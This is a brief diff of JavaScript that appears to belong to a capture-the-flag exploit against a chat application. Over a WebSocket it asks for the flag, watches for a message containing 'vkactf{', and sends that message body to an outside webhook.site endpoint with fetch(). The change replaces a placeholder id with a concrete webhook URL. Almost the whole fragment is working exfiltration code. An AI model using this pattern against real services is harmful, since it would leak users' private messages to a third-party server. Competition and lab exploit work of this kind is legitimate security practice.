@@ -16,7 +16,7 @@
       ws.send(JSON.stringify({ op: 'send_message', chat_id: msg.chat_id, body: 'flag' }));
     }
     if (msg.type === 'message' && msg.message?.body?.includes('vkactf{')) {
-      await fetch('https://webhook.site/YOUR-UUID?flag=' + encodeURIComponent(msg.message.body));
+      await fetch('https://webhook.site/7cf33045-2392-42a9-80d5-ef4a7ea32395?flag=' + encodeURIComponent(msg.message.body));
       window.__desklineDone = true;
     }
   };
